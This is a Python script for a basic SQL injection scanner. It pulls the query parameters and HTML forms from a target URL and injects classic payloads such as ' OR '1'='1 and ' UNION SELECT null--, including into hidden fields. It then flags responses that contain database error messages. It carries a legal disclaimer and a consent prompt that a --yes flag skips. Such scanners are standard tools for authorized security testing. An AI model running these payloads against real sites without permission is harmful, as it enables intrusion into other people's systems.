import argparse
import logging
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

# Legal Disclaimer
LEGAL_DISCLAIMER = """
========================================================================
WARNING: This tool is for educational and authorized testing purposes ONLY.
Do not use this tool on any target that you do not have explicit permission
to test. Unauthorized scanning is illegal and unethical.
========================================================================
"""

# Common SQL syntax errors indicating a potential vulnerability
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sqlstate",
    "pg::",
    "sqlite3::",
    "ora-",
    "microsoft sql server",
    "mysql_fetch_array()",
    "mysql_fetch_assoc()",
    "syntax error",
    "postgresql",
    "pg_query()",
]

# Basic SQL injection payloads
SQL_PAYLOADS = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' or 1=1--",
    "\" or 1=1--",
    "admin' --",
    "' UNION SELECT null--",
]

# Configure Basic Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler("sql_scanner.log"),
        logging.StreamHandler()
    ]
)

class SQLScanner:
    def __init__(self, target_url, max_threads=5, req_delay=1.0):
        self.target_url = target_url
        self.session = requests.Session()
        # Setting a user-agent to mimic a regular browser
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.max_threads = max_threads
        self.req_delay = req_delay
        self.vulnerabilities_found = 0

    def extract_forms(self, url):
        """Extract all forms from a given URL."""
        try:
            res = self.session.get(url, timeout=10)
            soup = BeautifulSoup(res.content, "html.parser")
            return soup.find_all("form")
        except requests.RequestException as e:
            logging.error(f"Error fetching URL {url}: {e}")
            return []

    def get_form_details(self, form):
        """Extract form details: action, method, and input names."""
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            if input_name:
                inputs.append({"type": input_type, "name": input_name, "value": input_value})
        
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def is_vulnerable(self, response):
        """Check content of response for common SQL error messages."""
        if not response or not response.content:
            return False
            
        content = response.content.decode(errors='ignore').lower()
        for error in SQL_ERRORS:
            if error in content:
                return True
        return False

    def scan_url_parameters(self, url):
        """Scan URL query parameters for vulnerabilities."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if not query_params:
            logging.info("No URL parameters found to scan.")
            return

        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        logging.info(f"Scanning URL parameters for {base_url}...")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for payload in SQL_PAYLOADS:
                for param in query_params:
                    # Inject payload into parameter
                    injected_params = query_params.copy()
                    injected_params[param] = [val + payload for val in injected_params[param]]
                    executor.submit(self.submit_url_payload, base_url, injected_params, payload, param)

    def submit_url_payload(self, base_url, params, payload, param_name):
        """Submit GET request with injected URL parameters."""
        time.sleep(self.req_delay)
        # Flatten params since parse_qs returns a dict of lists
        flat_params = {k: v[0] for k, v in params.items()}
        try:
            res = self.session.get(base_url, params=flat_params, timeout=10)
            if self.is_vulnerable(res):
                logging.warning(f"[!] SQL Injection Vulnerability Detected via URL Parameter!")
                logging.warning(f"[*] URL: {base_url}")
                logging.warning(f"[*] Vulnerable Parameter: {param_name}")
                logging.warning(f"[*] Payload used: {payload}")
                self.vulnerabilities_found += 1
        except requests.RequestException as e:
            logging.error(f"Error checking URL parameter on {base_url}: {e}")

    def scan_forms(self, url):
        """Scan HTML forms on the given URL for SQL injection vulnerabilities."""
        forms = self.extract_forms(url)
        if not forms:
            logging.info(f"No forms found on {url}.")
            return
            
        logging.info(f"Found {len(forms)} forms on {url}. Scanning...")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for i, form in enumerate(forms, start=1):
                form_d = self.get_form_details(form)
                logging.info(f"Scanning form {i} (Action: {form_d['action']}, Method: {form_d['method']})")
                for payload in SQL_PAYLOADS:
                    executor.submit(self.submit_form_payload, url, form_d, payload)

    def submit_form_payload(self, url, form_detail, payload):
        """Submit a specific payload to a form."""
        time.sleep(self.req_delay) # Rate limiting
        
        target_url = urljoin(url, form_detail["action"])
        data = {}
        for input_field in form_detail["inputs"]:
            if input_field["type"] == "hidden" or input_field["value"]:
                # Keep original value for hidden fields or pre-filled fields to bypass simple validations
                data[input_field["name"]] = input_field["value"] + payload
            elif input_field["type"] != "submit":
                # Inject payload into text/other input fields
                data[input_field["name"]] = f"test{payload}"

        try:
            if form_detail["method"] == "post":
                res = self.session.post(target_url, data=data, timeout=10)
            else: # Defaults to get
                res = self.session.get(target_url, params=data, timeout=10)
            
            if self.is_vulnerable(res):
                logging.warning(f"[!] SQL Injection Vulnerability Detected via Form!")
                logging.warning(f"[*] Form action URL: {target_url}")
                logging.warning(f"[*] Method: {form_detail['method'].upper()}")
                logging.warning(f"[*] Payload used: {payload}")
                logging.warning(f"[*] Injected Data: {data}")
                self.vulnerabilities_found += 1

        except requests.RequestException as e:
            logging.error(f"Error submitting form payload to {target_url}: {e}")

    def run(self, auto_consent=False):
        print(LEGAL_DISCLAIMER)
        
        if not auto_consent:
            user_consent = input(f"Do you have explicit permission to test {self.target_url}? (yes/no): ")
            if user_consent.lower().strip() != 'yes':
                logging.info("Exiting on user input.")
                return
        
        logging.info(f"Starting SQL Injection Scan on {self.target_url}")
        logging.info(f"Concurrency: {self.max_threads} threads, Rate Limit Delay: {self.req_delay} seconds.")
        
        self.scan_url_parameters(self.target_url)
        self.scan_forms(self.target_url)
        
        logging.info("Scan finished.")
        if self.vulnerabilities_found == 0:
            logging.info(f"No obvious SQL Injection vulnerabilities found on {self.target_url}")
        else:
            logging.warning(f"Total potential vulnerabilities detected: {self.vulnerabilities_found}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Basic SQL Injection Scanner")
    parser.add_argument("url", help="Target URL to scan (e.g. http://testphp.vulnweb.com/login.php)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds for rate limiting (default: 1.0)")
    parser.add_argument("--yes", action="store_true", help="Auto-confirm the legal disclaimer (Use with caution)")
    
    args = parser.parse_args()
    
    scanner = SQLScanner(args.url, max_threads=args.threads, req_delay=args.delay)
    scanner.run(auto_consent=args.yes)
